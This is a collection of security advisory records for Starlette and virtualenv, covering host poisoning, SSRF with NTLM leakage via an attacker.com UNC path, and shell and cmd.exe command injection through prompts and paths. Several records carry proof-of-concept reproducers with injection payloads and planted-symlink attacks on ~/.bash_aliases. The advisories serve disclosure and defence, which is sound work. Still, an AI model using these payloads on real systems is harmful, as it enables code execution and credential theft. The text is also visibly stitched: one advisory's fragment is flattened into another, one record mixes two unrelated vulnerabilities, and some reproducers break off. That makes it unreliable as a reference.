vulnerabilities.details:
### Summary

In affected versions, the HTTP request path is not validated before being used to reconstruct `request.url`. Because `request.url` is rebuilt by concatenating `{scheme}://{host}{path}` and re-parsing the result, a path that does not begin with `/` (for example `@google.com`) moves the authority boundary during re-parsing, so `request.url.hostname` and `request.url.netloc` become attacker-controlled. Code that reads `request.url.hostname` (rather than the `Host` header or `scope`) can therefore be misled into trusting an attacker-supplied host.

### Details

When a client requests a path that does not start with `/`:

```http
GET @google.com HTTP/1.1
Host: localhost
```

affected versions reconstruct the URL as `http://localhost@google.com`. Per [RFC 3986 §3.2.1](https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.1), the substring before `@` in the authority is `userinfo`, so re-parsing yields `username = "localhost"` and `hostname = "google.com"`, with an empty path:

```text
request.url          == "http://localhost@google.com"
request.url.hostname == "google.com"
request.url.path     == ""
```

The root cause is that the path is concatenated directly after the host without a separating `/`, and without validating that it begins with one. Only the `Host` header was validated when constructing `request.url`; the path was not.

This requires an ASGI server that forwards a request-target lacking a leading `/` into `scope["path"]`.

### Impact

Any application running an affected version that uses `request.url`, `request.url.netloc`, or `request.url.hostname` for a security-sensitive decision (host-based authorization, redirect/callback base, SSRF target, cache key, audit log) may be affected, when no fronting proxy or load balancer rejects the malformed request-target first.

Note that this is less exploitable than [GHSA-86qp-5c8j-p5mr](https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr): there, the poison is carried in the `Host` header, so the real path still routes to a valid endpoint while `request.url.path` lies. Here, the poison must be carried in the path itself, and that path (`@google.com`) does not match any registered route, so routing returns `404` and no endpoint handler runs. The exposure is limited to code that reads `request.url` before routing - notably middleware - or in 404/exception handlers.

### Mitigation

Upgrade to a patched version, which prevents the request path from crossing into the URL authority. The request above instead yields `http://localhost/@google.com` with `request.url.hostname == "localhost"`.
vulnerabilities.summary: Starlette: Unvalidated request path concatenated into authority poisons request.url.hostname

vulnerabilities.details:
### Summary

When serving static files on Windows, `StaticFiles` resolves the requested path with [`os.path.realpath`](https://docs.python.org/3/library/os.path.html#os.path.realpath). If a UNC path (such as `\\attacker.com\share`) reaches the resolver, `realpath` causes the process to open a connection to the remote host over SMB (port 445). This is a server-side request forgery (SSRF) that leaks the service account's NTLMv2 credentials to the attacker-controlled host, which can then be cracked offline or relayed to other hosts.

### Details

`StaticFiles.lookup_path()` joins the requested path onto the served directory and calls [`os.path.realpath`](https://docs.python.org/3/library/os.path.html#os.path.realpath) on the result before checking containment with [`os.path.commonpath`](https://docs.python.org/3/library/os.path.html#os.path.commonpath). On Windows, a UNC path is absolute, so [`os.path.join`](https://docs.python.org/3/library/os.path.html#os.path.join) discards the served directory and `realpath` resolves the bare UNC path, triggering the outbound SMB connection and NTLM authentication before the containment check rejects the path. The HTTP response is a benign 404, but the credential disclosure has already happened. POSIX systems are not affected.

This only affects the default configuration (`follow_symlink=False`), which uses [`os.path.realpath`](https://docs.python.org/3/library/os.path.html#os.path.realpath). The `follow_symlink=True` branch uses [`os.path.abspath`](https://docs.python.org/3/library/os.path.html#os.path.abspath), which performs no I/O.

### Impact

Applications running on Windows that serve files with `StaticFiles` (directly, or via a framework built on Starlette such as FastAPI) in the default configuration are affected. `StaticFiles` is typically unauthenticated, so any client can trigger the SMB connection and leak the service account's NTLMv2 hash. A secondary impact is discovering internal hosts reachable over SMB by timing responses for valid versus invalid addresses.

### Mitigation

Applications not running on Windows are not affected. On Windows, serving static files through a dedicated web server (such as nginx or IIS) instead of `StaticFiles` avoids the issue. Blocking outbound SMB (port 445) from the application host prevents the credential disclosure even if a UNC path is resolved.
vulnerabilities.summary: Starlette: SSRF and NTLM credential theft via UNC paths in StaticFiles on Windows

vulnerabilities.details:
### Summary

When dispatching a request, `HTTPEndpoint` selects the handler by lowercasing the HTTP method and looking it up as an attribute with `getattr`, without restricting the lookup to a known set of HTTP verbs.

When an `HTTPEndpoint` subclass is registered through `Route(...)` without an explicit `methods=` argument, the route does not constrain the method and every method reaches the endpoint. If a non-standard HTTP method whose lowercased name matches an attribute on the endpoint subclass reaches the endpoint, that attribute is invoked as if it were a request handler. An attacker can use this to reach methods that were never meant to be HTTP handlers, such as internal helpers, without the authorization checks applied by the intended public handler.

### Details

`HTTPEndpoint` uses the client-supplied method name to resolve an instance attribute, without validating it against the set of HTTP verbs the endpoint supports. A method such as `_DO_DELETE` therefore resolves an attribute like `_do_delete` and invokes it. Non-standard methods are valid [RFC 9110](https://www.rfc-editor.org/rfc/rfc9110#name-method) token methods, so an endpoint must not treat the method name as a trusted attribute selector.

### Impact

An application is affected when all of the following hold:

* It defines an `HTTPEndpoint` subclass and registers it via `Route(...)` without an explicit `methods=` argument.
* The subclass defines additional methods whose names match a non-standard HTTP-method token shape and that accept a single `request` argument and return a response.

This also affects frameworks built on Starlette, like FastAPI.

### Mitigation

Register `HTTPEndpoint` subclasses with an explicit `methods=` argument on the `Route`, listing only the HTTP verbs the endpoint supports. The route then rejects any other method with `405 Method Not Allowed` before it reaches the endpoint, so non-standard methods cannot resolve an attribute.
vulnerabilities.summary: Starlette: Arbitrary HTTP method dispatched to `HTTPEndpoint` attributes via `getattr`

vulnerabilities.details: virtualenv before 20.26.6 allows command injection through the activation scripts for a virtual environment. Magic template strings are not quoted correctly when replacing. NOTE: this is not the same as CVE-2024-9287.

## Impact

TOCTOU (Time-of-Check-Time-of-Use) vulnerabilities in `virtualenv` allow local attackers to perform symlink-based attacks on directory creation operations. An attacker with local access can exploit a race condition between directory existence checks and creation to redirect virtualenv's app_data and lock file operations to attacker-controlled locations.

**Affected versions:** All versions up to and including 20.36.1

**Affected users:** Any user running `virtualenv` on multi-user systems where untrusted local users have filesystem access to shared temporary directories or where `VIRTUALENV_OVERRIDE_APP_DATA` points to a user-writable location.

**Attack scenarios:**
- Cache poisoning: Attacker corrupts wheels or Python metadata in the cache
- Information disclosure: Attacker reads sensitive cached data or metadata
- Lock bypass: Attacker controls lock file semantics to cause concurrent access violations
- Denial of service: Lock starvation preventing virtualenv operations

## Patches

The vulnerability has been patched by replacing check-then-act patterns with atomic `os.makedirs(..., exist_ok=True)` operations.

**Fixed in:** PR #3013

**Versions with the fix:** 20.36.2 and later

Users should upgrade to version 20.36.2 or later.

## Workarounds

If you cannot upgrade immediately:

1. Ensure `VIRTUALENV_OVERRIDE_APP_DATA` points to a directory owned by the current user with restricted permissions (mode 0700)
2. Avoid running `virtualenv` in shared temporary directories where other users have write access
3. Use separate user accounts for different projects to isolate app_data directories

## References

- GitHub PR: https://github.com/pypa/virtualenv/pull/3013
- Vulnerability reported by: @tsigouris007
- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (TOCTOU)
- CWE-59: Improper Link Resolution Before File Access
vulnerabilities.summary: virtualenv Has TOCTOU Vulnerabilities in Directory Creation

vulnerabilities.details:
`download_wheel()` runs `pip download` and hands the result straight to the
seeder, with nothing checking the bytes it gets back. The embedded pip and
setuptools wheels carry a `BUNDLE_SHA256` that virtualenv checks on every load,
but a wheel fetched over the network for the periodic-update feature or the
`--download` flag had no equivalent verification.

A compromised index, a stale mirror, or a MITM'd download (when TLS is
intercepted, e.g. via a misconfigured or malicious CA) could substitute a
different wheel under the same distribution/version/filename, and virtualenv
would cache and seed it into every environment created afterward with no
warning.

Fixed in 21.7.12 by computing the downloaded wheel's sha256 and comparing it
against the digest PyPI's public JSON API reports for that exact release,
independent of which index actually served the file. The check is skipped, not
treated as failure, when a custom index (`PIP_INDEX_URL`,
`PIP_EXTRA_INDEX_URL`, `PIP_INDEX`) is configured, since a private index can
legitimately serve a different, intentionally rebuilt wheel.
vulnerabilities.summary: Downloaded seed wheels (pip/setuptools) are not integrity-checked before use

vulnerabilities.details:
`pyvenv.cfg` is a line-based format with no escape syntax. `PyEnvCfg.write()`
wrote values verbatim, while `PyEnvCfg._read_values()` parses the file with
`str.splitlines()`. A value containing a line boundary therefore became
additional configuration lines, and because reading is last-wins, the injected
keys replaced any key written earlier in the file.

The `prompt` value is the reachable input: it is set by `--prompt`, by the
`VIRTUALENV_PROMPT` environment variable, or from the config file, and
`write()` emits `prompt` before `home`. A crafted prompt can therefore set
`home` in the generated `pyvenv.cfg`. `home` is what tooling reads to locate
the base interpreter, so a consumer that trusts it can be pointed elsewhere.
`implementation`, `version_info`, `version`, `executable`, `command` and
`virtualenv` are also written before `prompt` and can be replaced the same
way.

This requires the prompt to come from somewhere other than the person running
the command, for example a CI job templating a branch name into it, tooling
deriving an environment name from user-supplied data, or an inherited
`VIRTUALENV_PROMPT`.

The boundary set is the one `str.splitlines()` recognizes, which is wider than
`\n`: `\r`, `\v`, `\f`, the file, group and record separators, `U+0085`,
`U+2028` and `U+2029` were all written through unchanged and all split the
line when read back.

Fixed in 21.7.11: `PyEnvCfg.write()` now collapses those boundaries to spaces
as it serializes each line, so it cannot emit a structurally invalid file
regardless of what a caller places in `content`.
vulnerabilities.summary: virtualenv writes prompt values into pyvenv.cfg without sanitizing line boundaries, allowing configuration injection

vulnerabilities.details:
The generated `activate` (bash/zsh) and `activate.fish` scripts interpolate a
`shlex.quote`-ed value into a position that quotes it a second time. The extra
quotes terminate the quoted run early and leave part of the value parsed as
shell code, so a path containing shell metacharacters runs commands when a user
sources the activation script.

`activate` is affected through the virtual environment's own path, on the branch
that reports a relocated environment (`Virtual environment directory
__VIRTUAL_ENV__ does not exist!`). For a destination named `x'$(id)'y`,
`shlex.quote` emits `'x'"'"'$(id)'"'"'y'`; the inner `"` closes the enclosing
double quote and `$(id)` is left unquoted. This branch runs whenever the
recorded path is absent, which is the normal case for a virtual environment
copied or distributed to another machine.

`activate.fish` is affected through the interpreter's Tcl/Tk library paths
(`set -gx TCL_LIBRARY '__TCL_LIBRARY__'`). The rendered line becomes
`''/tcl/(cmd)/lib''`, and fish expands the `(cmd)` left between the adjacent
quoted runs. The same doubling splits a path containing a space into two list
elements, corrupting `TCL_LIBRARY` and `TK_LIBRARY`.

This is the same defect class as GHSA-x78j-v8h9-3j2q, which covered
`activate.bat`.

Fixed in 21.7.13 by moving the placeholders outside the surrounding quotes, so
each value keeps only the quoting `shlex.quote` applied.
vulnerabilities.summary: virtualenv bash and fish activation scripts execute commands embedded in paths

vulnerabilities.details:
`BatchActivator.quote()` returned its input unchanged, the only activator with
no escaping at all. `--prompt`, the `VIRTUALENV_PROMPT` environment variable,
and the config file all set the prompt, and `activate.bat` writes it straight
into `@set "VAR=value"`. A prompt containing a double quote closes that string
early, and whatever follows runs as live cmd.exe syntax. For example, a venv
created with `--prompt 'x" & calc & "'` runs `calc` the moment someone runs
`activate.bat`.

Anyone who templates a prompt from untrusted input (a CI job using a branch
name, a wrapper script deriving an environment name from user input) hands an
attacker code execution in the shell of anyone who activates the resulting venv
on Windows.

Fixed in 21.7.12 by escaping the characters cmd.exe treats as live syntax
inside this construct.
vulnerabilities.summary: Command injection via --prompt in activate.bat (batch activator)

vulnerabilities.details:
## Summary

Caller-supplied prompt text can become executable syntax in the xonsh activation script. An attacker must influence the
value passed to virtualenv, and a user must subsequently activate the environment.

## Affected area

Xonsh reads a UTF-8 activation script using a legacy multibyte encoding such as GBK. Printable non-ASCII bytes can
change how the reader recognizes an adjacent quote. The report concerns POSIX activation. It does not establish exposure
through unrelated activators.

## Attacker-controlled input

The attacker controls prompt or destination data passed as a virtualenv argument. The user later sources the generated
activation script.

## Affected code

The relevant 21.14.8 source is in
[xonsh quote()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/xonsh/__init__.py),
[UTF-8 template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py).

## Mechanism

The generator writes `activate.xsh` as UTF-8. Its `quote()` used `repr()`, which leaves printable non-ASCII characters
in the file and backslash-escapes an embedded quote. Xonsh's `source` reads the file using `$XONSH_ENCODING`. With GBK
or Big5, the UTF-8 bytes of `中` end in `0xad`, which pairs with the following `0x5c` backslash as one decoded character.
The backslash no longer escapes the quote. A prompt containing both quote kinds can then close its Python string literal
and supply statements that run during activation. With UTF-8 source decoding, the same value stays inside the literal.

## Reproduction and evidence

The original scanner finding, `ANT-2026-PAUVP7YL`, demonstrated this byte-level failure in `activate_this.py`: a hostile
prompt loaded through `exec(open(file).read(), ...)` under GBK created a marker, while UTF-8 and `runpy.run_path`
controls did not. The xonsh path in this advisory was identified in the subsequent maintainer-provided review.
[PR #3432](https://github.com/pypa/virtualenv/pull/3432) shows the xonsh source-decoding chain and changes `quote()` to
`ascii()`, which writes non-ASCII characters as escapes. Its regression test encodes the generated literal as ASCII,
decodes it as GBK, and checks that `ast.literal_eval` returns the original prompt.

The attack needs control of the prompt or destination value, an affected xonsh source encoding, and later sourcing of
the generated file. The original `activate_this.py` reproducer does not itself prove xonsh execution; that result is
attributed to the separate review. Existing `activate.xsh` files must be regenerated after the fix.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prompt supplier
    participant V as virtualenv quote()
    participant F as activate.xsh bytes
    participant X as xonsh source
    A->>V: 中 plus escaped quote and statements
    V->>F: repr writes UTF-8 中 followed by backslash
    alt XONSH_ENCODING is UTF-8
        F->>X: backslash remains an escape
        X-->>A: prompt remains data
    else XONSH_ENCODING is GBK or Big5
        F->>X: decoder consumes backslash as trail byte
        X->>X: quote closes and statements run
    end
    Note over V,X: ascii() emits only ASCII bytes and preserves the literal
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-PAUVP7YL`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import subprocess
import sys
from pathlib import Path
from shutil import rmtree

work = Path("/tmp/activate-this-gbk")
rmtree(work, ignore_errors=True)
work.mkdir()
env_dir = work / "venv"
marker = work / "MARKER"

# set up: a zh_CN.GBK locale, which the image does not ship
subprocess.run([sys.executable, "/tmp/repro.d/install_gbk_locale.py", work / "locales"], check=True)
utf8_session = {"PATH": os.environ["PATH"], "LANG": "C.UTF-8"}
gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": str(work / "locales")}

# attacker: text that a tool relays as --prompt
# the payload's " makes repr() delimit with ' and write the prompt's own ' as \'
# 中 is e4 b8 ad in UTF-8; GBK reads e4 b8 as one character and ad 5c, ad plus that backslash, as the next
payload = f'__import__("os").system("touch {marker}")'
hostile_prompt = "中" + "';" + payload + "#"

# user: creates the environment with the virtualenv command
subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", "--prompt", hostile_prompt, env_dir], check=True)
activate_this = (env_dir / "bin" / "activate_this.py").read_bytes()
prompt_line = next(line for line in activate_this.splitlines() if line.startswith(b'os.environ["VIRTUAL_ENV_PROMPT"]'))
print(f"activate_this.py read as UTF-8: {prompt_line.decode('utf-8')}")
print(f"activate_this.py read as GBK:   {prompt_line.decode('gbk')}")
assert not marker.exists(), "payload ran at creation time"

# trigger: the same program activates the environment, first in a UTF-8 session, then in a GBK one
activate = [sys.executable, "/tmp/repro.d/activate_with_exec_open.py", env_dir]
control = subprocess.run(activate, env=utf8_session, stdout=subprocess.PIPE, encoding="utf-8", check=True)
ran_in_utf8_session = marker.exists()
print(f"CONTROL  UTF-8 session: {control.stdout.strip()}; {marker} exists: {ran_in_utf8_session}")

observed = subprocess.run(activate, env=gbk_session, stdout=subprocess.PIPE, encoding="gbk", check=True)
ran_in_gbk_session = marker.exists()
print(f"OBSERVED GBK session:   {observed.stdout.strip()}; {marker} exists: {ran_in_gbk_session}")

# check: the prompt is data and must not run in either session
print("BUG" if ran_in_gbk_session and not ran_in_utf8_session else "OK")
```

**`repro.d/activate_with_exec_open.py`**

```text

# usage: activate_with_exec_open.py ENV_DIR
# A program that activates a virtualenv the way activate_this.py's docstring said to until virtualenv 20.26.2.
import locale
import os
import sys

this_file = os.path.join(sys.argv[1], "bin", "activate_this.py")
exec(open(this_file).read(), {"__file__": this_file})

print(f"open() decodes as {locale.getpreferredencoding(False)}, VIRTUAL_ENV_PROMPT is {os.environ['VIRTUAL_ENV_PROMPT']}")
```

**`repro.d/install_gbk_locale.py`**

```text
#!/usr/bin/env python3
# usage: install_gbk_locale.py LOCPATH
# Does what `locale-gen zh_CN.GBK` would; the image has glibc's localedef but no charmap or locale sources.
import os
import subprocess
import sys

locpath = sys.argv[1]
os.makedirs(locpath)

charmap = ["<code_set_name> GBK", "<comment_char> %", "<escape_char> /", "<mb_cur_min> 1", "<mb_cur_max> 2", "CHARMAP"]
charmap += [f"<U{byte:04X}> /x{byte:02x}" for byte in range(0x80)]
for lead in range(0x81, 0xFF):
    for trail in range(0x40, 0xFF):
        try:
            char = bytes([lead, trail]).decode("gbk")
        except UnicodeDecodeError:
            continue
        charmap.append(f"<U{ord(char):04X}> /x{lead:02x}/x{trail:02x}")
charmap.append("END CHARMAP")
with open(f"{locpath}/GBK.charmap", "w") as charmap_file:
    charmap_file.write("\n".join(charmap) + "\n")

# -c: the source has no LC_TIME, LC_MONETARY, ...; localedef fills in defaults, warns and exits 1, so check the result below
source = "/tmp/repro.d/zh_CN_minimal.locale"
subprocess.run(["localedef", "-c", "-f", f"{locpath}/GBK.charmap", "-i", source, f"{locpath}/zh_CN.GBK"], capture_output=True)

gbk_session = {"PATH": os.environ["PATH"], "LANG": "zh_CN.GBK", "LOCPATH": locpath}
codeset = subprocess.run(["locale", "charmap"], env=gbk_session, capture_output=True, text=True, check=True)
if codeset.stdout.strip() != "GBK" or codeset.stderr:
    sys.exit(f"zh_CN.GBK locale not usable: {codeset}")
```

**`repro.d/zh_CN_minimal.locale`**

```text
comment_char %
escape_char /
% Stand-in for glibc's locales/zh_CN: ASCII character classes only. What matters is the codeset name, GBK, which
% comes from the charmap given to localedef with -f.
LC_CTYPE
upper <U0041>..<U005A>
lower <U0061>..<U007A>
digit <U0030>..<U0039>
space <U0009>..<U000D>;<U0020>
cntrl <U0000>..<U001F>;<U007F>
punct <U0021>..<U002F>;<U003A>..<U0040>;<U005B>..<U0060>;<U007B>..<U007E>
xdigit <U0030>..<U0039>;<U0041>..<U0046>;<U0061>..<U0066>
blank <U0009>;<U0020>
END LC_CTYPE
LC_COLLATE

order_end
END LC_COLLATE
```

## Impact

An affected activation can execute commands with the user's privileges. Severity is high, following the generated-script
precedent in [GHSA-p58f-9548-mpm2](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The
attack requires control of argument data and subsequent user activation; it does not require replacing an executable or
controlling app-data contents.

## Versions tested

The supplied follow-up review marks command execution as independently confirmed by its author. The implementation
review used source inspection and patched literal-value checks, without rerunning that exploit. The relevant activation
source is identical between release 21.14.8 and upstream/main 233359cb. The maintainer previously confirmed validation
of the reported findings on 21.14.8. The first affected version has not been established. Fixed in 21.14.9.

## Known mitigation

Use trusted prompt and destination values. Use UTF-8 source decoding in xonsh on older releases.
Recreate environments with virtualenv 21.14.9 or later.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

The original report was supplied by Anthropic's OSS Scanner as ANT-2026-PAUVP7YL. The subsequent maintainer-provided
review identified the remaining activation path.

## Additional fix branch

[PR #3411](https://github.com/pypa/virtualenv/pull/3411) also uses ASCII-only literals for paths and prompts, alongside
its activation-state changes. Both branches must retain this quoting rule when integrated.
vulnerabilities.summary: virtualenv: Xonsh activation literals depend on the script decoding codec

vulnerabilities.details:
## Summary

The deletion error handler obtains permission bits with lstat() but applies them through chmod(), which follows
symlinks. On an eligible unlink failure this can change permissions outside the destination.

Anthropic's OSS Scanner reported this as `ANT-2026-UK90QC27` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Permission recovery after a filesystem deletion error.

## Attacker-controlled input

A deletion must fail on a symbolic-link entry and enter the permission-recovery branch. The invoking user must have
permission to change the target mode. This is conditional error handling, not the normal successful unlink path.

## Affected code

The relevant 21.14.8 source is in
[safe_delete()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

`safe_delete()` asks `shutil.rmtree()` to retry a failed removal after adding owner-write permission. Its error handler
calls `os.lstat(path)` for mode bits but `os.chmod(path, ...)` to apply them. For a symlink, `lstat` reads the link's
mode while `chmod` follows the link. A link inside a read-only directory can therefore cause the target's mode to become
`0777` before the retry fails. The target must be owned by the invoking user and initially not writable by that user;
root does not reach this failure path.

## Reproduction and evidence

The scanner packed a project containing a mode-`0555` `venv/bin/python/` directory and a symlink inside it pointing to
the user's mode-`0400` `keys/deploy.pem`. An unprivileged user unpacked it and ran both plain `virtualenv venv` and
`virtualenv --clear venv`. Both commands exited with `PermissionError` naming the directory inside `venv`, while the
key's mode changed from `0400` to `0777`. A control archive with a writable directory completed normally and left the
key at `0400`. The read-only mode survives `tar` or `cp -a`; a normal git clone does not preserve this setup.

This changes permissions; it does not read the target or complete the virtualenv operation. Another account can use the
widened mode only if it can traverse the target's parent directories. The scanner dates the active error handler to
#3222, first released in 21.7.5. [PR #3427](https://github.com/pypa/virtualenv/pull/3427) avoids POSIX mode changes on
deletion failure and handles Windows read-only entries without following reparse points.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared read-only venv tree
    participant V as safe_delete error handler
    participant L as Symlink in venv
    participant K as User's 0400 key
    A->>V: virtualenv venv or --clear venv
    V->>L: unlink fails in 0555 directory
    V->>L: lstat returns link mode 0777
    V->>L: chmod follows symlink
    L->>K: target mode becomes 0777
    V-->>A: retry fails with PermissionError
    Note over K: Other accounts can use new mode if parent paths are traversable
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-UK90QC27`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

NOBODY = 65534

work = Path(tempfile.mkdtemp(prefix="repro-safe-delete-"))
os.chmod(work, 0o755)
os.chown(work, NOBODY, NOBODY)

# the attacker's project archive (venv/bin/python read-only), and the same archive with that folder writable
make_archive = [sys.executable, "/tmp/repro.d/make_project_archive.py"]
subprocess.run([*make_archive, work / "read-only.tar", "555"], check=True)
subprocess.run([*make_archive, work / "writable.tar", "755"], check=True)
subprocess.run(["tar", "-tvf", work / "read-only.tar"], check=True)

# from here on an ordinary user: root's unlink never fails, so safe_delete's error handler would never run
os.setgroups([])
os.setgid(NOBODY)
os.setuid(NOBODY)
os.umask(0o022)


def unpack_next_to_key_and_run_virtualenv(label, home_name, archive_name, *options):
    home = work / home_name
    archive = work / archive_name
    key = home / "keys" / "deploy.pem"
    key.parent.mkdir(parents=True)
    key.write_text("PRIVATE KEY\n")
    key.chmod(0o400)
    subprocess.run(["tar", "-xf", archive], cwd=home, check=True)

    mode_before = stat.S_IMODE(key.stat().st_mode)
    command = ["virtualenv", "--no-periodic-update", "-q", *options, "venv"]
    # HOME is where virtualenv keeps its app-data; nobody's own, /nonexistent, cannot hold it
    result = subprocess.run(
        command,
        cwd=home / "proj",
        env={**os.environ, "HOME": str(home)},
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    mode_after = stat.S_IMODE(key.stat().st_mode)

    print(f"{label} {archive_name}, `{' '.join(command)}`: exit {result.returncode} {result.stdout.strip()}")
    print(f"{label} {key} mode {mode_before:#o} -> {mode_after:#o}")
    return mode_before, mode_after


control = unpack_next_to_key_and_run_virtualenv("CONTROL ", "home-control", "writable.tar")
```

## Impact

Permission recovery after a failed deletion can change an unrelated target's access bits. This requires the deletion
failure to occur on a link and the invoking user to have permission to change the target mode.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix leaves POSIX modes unchanged when deletion fails. Windows read-only recovery uses a native handle that
opens the entry itself without following reparse points and denies replacement until the attribute update finishes. It
rejects reparse points and clears only the read-only attribute. Concurrent replacement of parent directories remains
outside this protection.

Fix: [PR #3427](https://github.com/pypa/virtualenv/pull/3427).

## Known mitigation

Avoid recursively clearing destinations populated by another account. If cleanup fails, inspect the failing entry before
retrying with broader privileges.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-UK90QC27.

Default-index digest verification must be enabled. Existing custom-index exceptions are outside the promised PyPI comparison. ## Affected code The relevant 21.14.8 source is in [wheel download and digest check](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/wheels/acquire.py). ## Mechanism `download_wheel()` tells pip to write directly into the reusable `wheel/house` cache. It then selects a path to hash from the first `Saved ` line in pip's stdout, rather than from the file pip actually placed there. A package index can inject such a line through a discarded link's `data-requires-python` attribute. A separate failure exists without the forged line: a digest mismatch raises after the downloaded wheel has entered the cache, and the rejected bytes remain there. Later wheel selection does not hash the cached file again. ## Reproduction and evidence The scanner used a local index configured in `pip.conf`, with PyPI digest comparison still enabled. ## Summary

Generated activation files and pyvenv.cfg can follow existing links and write outside the requested environment. The
template writer tests exists() before unlinking, which misses dangling symlinks; the configuration writer opens the
existing path directly.

Anthropic's OSS Scanner reported this as `ANT-2026-XBEOCBS1` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Final file entries written during environment creation and seeding.

## Attacker-controlled input

Another account must be able to prepare file links in the destination before creation. The invoking user must have write
permission at the linked target. The destination parent must remain controlled during creation; concurrent
parent-directory replacement is a separate concern.

## Affected code

The relevant 21.14.8 source is in
[template writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/activation/via_template.py),
[configuration writer](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/pyenv_cfg.py).

## Mechanism

`ViaTemplateActivator._generate()` removes an existing output only when `Path.exists()` is true. A dangling symlink
therefore survives, and `write_bytes()` creates its target outside the environment. Other generated files have related
final-entry behavior. `PyEnvCfg.write()` opens `pyvenv.cfg` without first replacing an existing link; a symlink or hard
link there can overwrite an existing target. These paths require a prepared destination tree and the invoking user's
permission to write the linked target.

## Reproduction and evidence

The scanner's project tree contains `venv/bin/activate -> ../../../.bash_aliases` and an executable `venv/bin/basename`.
Before creation, a new interactive bash does not create the marker. A plain `virtualenv venv` writes the activation
script through the dangling link, creating `~/.bash_aliases` as a regular file. Debian's stock `.bashrc` sources that
file; the next interactive bash adds `venv/bin` to `PATH` and the planted `basename` writes the marker. The reproducer
checks that the link remains, `~/.bash_aliases` appears, and the second shell executes the planted file. A separate
manual check links `pyvenv.cfg` to `~/.bashrc` and observes the latter replaced with generated configuration text.

The link lets creation write outside the requested environment. The attacker chooses the target path but the generated
bytes come from virtualenv. The executable in the example was already in the prepared tree; this finding is not
arbitrary code injection into an otherwise trusted destination. The scanner traces the template behavior to #1454, first
released in 20.0.0b1. [PR #3431](https://github.com/pypa/virtualenv/pull/3431) replaces pre-existing output links and
uses exclusive creation for generated text. It does not make a destination safe if another account can replace parent
directories during creation.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared project tree
    participant V as virtualenv writer
    participant H as User home
    participant B as Next interactive bash
    A->>V: venv/bin/activate links to missing ~/.bash_aliases
    V->>V: Path.exists() follows link and returns false
    V->>H: write activation bytes through link
    H-->>B: ~/.bash_aliases now exists
    B->>H: .bashrc sources ~/.bash_aliases
    B->>A: PATH reaches planted venv/bin/basename
    A-->>B: marker created
    Note over V,H: pyvenv.cfg can also overwrite an existing linked target
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-XBEOCBS1`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
import tempfile

# set up: a fresh home with Debian's stock ~/.bashrc, which sources ~/.bash_aliases when that file exists
home = tempfile.mkdtemp(prefix="home-")
shutil.copy("/etc/skel/.bashrc", f"{home}/.bashrc")
bash_aliases = f"{home}/.bash_aliases"
marker = f"{home}/attacker-ran"
open_terminal = ["bash", "-i", "-c", "true"]
terminal_env = {"HOME": home, "PATH": "/usr/bin:/bin", "TERM": "dumb"}

# the attacker's repository, cloned by the user to ~/proj
checkout = f"{home}/proj"
subprocess.run([sys.executable, "/tmp/repro.d/make_hostile_checkout.py", checkout], check=True)
activate = f"{checkout}/venv/bin/activate"
print("shipped: venv/bin/activate ->", os.readlink(activate), flush=True)

# a terminal opened before virtualenv runs does not touch the checkout (stderr: bash -i without a tty warns)
subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)
print("before virtualenv: ~/.bash_aliases exists:", os.path.lexists(bash_aliases), "| marker exists:", os.path.exists(marker), flush=True)
assert not os.path.lexists(bash_aliases) and not os.path.exists(marker)

# trigger: the user creates an environment in the checkout, then opens a new terminal
subprocess.run(["virtualenv", "--no-periodic-update", "venv"], cwd=checkout, env={**os.environ, "HOME": home}, check=True)
subprocess.run(open_terminal, env=terminal_env, stderr=subprocess.DEVNULL, check=True)

# check: the activation script belongs in venv/bin/activate; it must not be written through the link to ~/.bash_aliases
print("venv/bin/activate is still the symlink:", os.path.islink(activate))
